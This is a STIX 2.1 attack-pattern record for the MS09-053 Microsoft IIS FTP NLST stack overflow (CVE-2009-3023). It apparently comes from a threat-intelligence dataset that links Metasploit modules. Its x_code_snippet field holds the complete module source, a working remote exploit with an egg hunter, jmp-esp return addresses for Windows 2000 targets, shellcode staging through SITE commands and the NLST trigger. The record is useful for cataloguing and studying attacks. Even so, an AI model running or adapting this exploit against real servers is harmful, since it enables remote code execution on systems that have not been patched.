{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--358c0791-5186-4e12-8312-5e64ee6106cf",
    "created": "2024-08-14T16:51:11.345541Z",
    "modified": "2024-08-14T16:51:11.345545Z",
    "name": "MS09-053 Microsoft IIS FTP Server NLST Response Overflow",
    "description": " This module exploits a stack buffer overflow flaw in the Microsoft IIS FTP service. The flaw is triggered when a special NLST argument is passed while the session has changed into a long directory path. For this exploit to work, the FTP server must be configured to allow write access to the file system (either anonymously or in conjunction with a real account) ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/ms09_053_ftpd_nlst.rb",
            "external_id": "ms09_053_ftpd_nlst.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-3023"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Ftp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS09-053 Microsoft IIS FTP Server NLST Response Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow flaw in the Microsoft IIS FTP\n        service. The flaw is triggered when a special NLST argument is passed\n        while the session has changed into a long directory path. For this exploit\n        to work, the FTP server must be configured to allow write access to the\n        file system (either anonymously or in conjunction with a real account)\n      },\n      'Author'         => [ 'Kingcope <kcope2[at]googlemail.com>', 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['EDB', '9541'],\n          ['CVE', '2009-3023'],\n          ['OSVDB', '57589'],\n          ['BID', '36189'],\n          ['MSB', 'MS09-053'],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 490,\n          'BadChars' => \"\\x00\\x09\\x0c\\x20\\x0a\\x0d\\x0b\",\n          # This is for the stored payload, the real BadChar list for file paths is:\n          # \\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x22\\x2a\\x2e\\x2f\\x3a\\x3c\\x3e\\x3f\\x5c\\x7c\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => [ 'win' ],\n      'Targets'        =>\n        [\n          [\n            'Windows 2000 SP4 English/Italian (IIS 5.0)',\n            {\n              'Ret'      => 0x773d24eb,  # jmp esp in activeds.dll (English / 5.0.2195.6601)\n              'Patch'    => 0x7ffd7ffd   # works for off-by-two alignment\n            },\n          ],\n          [\n            'Windows 2000 SP3 English (IIS 5.0)',\n            {\n              'Ret'      => 0x77e42ed8,  # jmp esp in user32.dll (English / 5.0.2195.7032)\n              'Patch'    => 0x7ffd7ffd   # works for off-by-two alignment\n            },\n          ],\n          [\n            # target from TomokiSanaki\n            'Windows 2000 SP0-SP3 Japanese (IIS 5.0)',\n            {\n              'Ret'      => 0x774fa593,  # jmp esp in ?? (Japanese)\n              'Patch'    => 0x7ffd7ffd   # works for off-by-two alignment\n            },\n          ],\n        ],\n      'DisclosureDate' => '2009-08-31',\n      'DefaultTarget' => 0))\n\n    register_options([Opt::RPORT(21),])\n  end\n\n\n  def exploit\n    connect_login\n\n\n    based = rand_text_alpha_upper(10)\n\n    res   = send_cmd( ['MKD', based ], true )\n    print_status(res.strip)\n\n    if (res !~ /directory created/)\n      print_error(\"The root directory of the FTP server is not writeable\")\n      disconnect\n      return\n    end\n\n    res   = send_cmd( ['CWD', based ], true )\n    print_status(res.strip)\n\n    egg = rand_text_alpha_upper(4)\n    hun = \"\\xB8\\x55\\x55\\x52\\x55\\x35\\x55\\x55\\x55\\x55\\x40\\x81\\x38#{egg}\\x75\\xF7\\x40\\x40\\x40\\x40\\xFF\\xE0\"\n\n    # This egg hunter is necessary because of the huge set of restricted characters for directory names\n    # The best that metasploit could so was 133 bytes for an alphanum encoded egg hunter\n    # The egg hunter above was written by kcope and searches from 0x70000 forward (stack) in order\n    # to locate the real shellcode. The only change from the original hunter was to randomize the\n    # prefix used.\n\n    # Store our real shellcode on the stack\n    1.upto(5) do\n      res = send_cmd( ['SITE', egg + payload.encoded.gsub(\"\\xff\", \"\\xff\\xff\") ], true )\n    end\n\n    # Create the directory path that will be used in the overflow\n    pre = rand_text_alpha_upper(3)              # esp+0x28 points here\n    pst = rand_text_alpha_upper(210)            # limited by max path\n\n    pst[  0, hun.length]  = hun                 # egg hunter\n    pst[ 90,  4]  = [target['Patch']].pack('V') # patch smashed pointers\n    pst[ 94,  4]  = [target['Patch']].pack('V')\t# patch smashed pointers\n    pst[140, 32]  = [target['Patch']].pack('V') * 8  # patch smashed pointers\n    pst[158,  4]  = [target.ret].pack(\"V\")      # return\n    pst[182,  5]  = \"\\xe9\" + [-410].pack(\"V\")   # jmp back\n\n    # Escape each 0xff with another 0xff for FTP\n    pst = pst.gsub(\"\\xff\", \"\\xff\\xff\")\n\n    print_status(\"Creating long directory...\")\n    res   = send_cmd( ['MKD', pre+pst ], true )\n    print_status(res.strip)\n\n    srv\t  = Rex::Socket::TcpServer.create(\n      'LocalHost' => '0.0.0.0',\n      'LocalPort' =>  0,\n      'SSL'       => false,\n      'Context'   => {\n          'Msf'        => framework,\n          'MsfExploit' => self,\n      }\n    )\n\n    add_socket(srv)\n\n    begin\n\n    thr = framework.threads.spawn(\"Module(#{self.refname})-Listener\", false) { srv.accept }\n\n      prt   = srv.getsockname[2]\n      prt1  = prt / 256\n      prt2  = prt % 256\n\n      addr  = Rex::Socket.source_address(rhost).gsub(\".\", \",\") + \",#{prt1},#{prt2}\"\n\n      res   = send_cmd( ['PORT', addr ], true )\n      print_status(res.strip)\n\n      print_status(\"Trying target #{target.name}...\")\n\n      res   = send_cmd( ['NLST', pre+pst + \"*/../\" + pre + \"*/\"], true )\n      print_status(res.strip) if res\n\n      select(nil,nil,nil,2)\n\n      handler\n      disconnect\n\n    ensure\n      thr.kill\n      srv.close\n\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-08-31",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}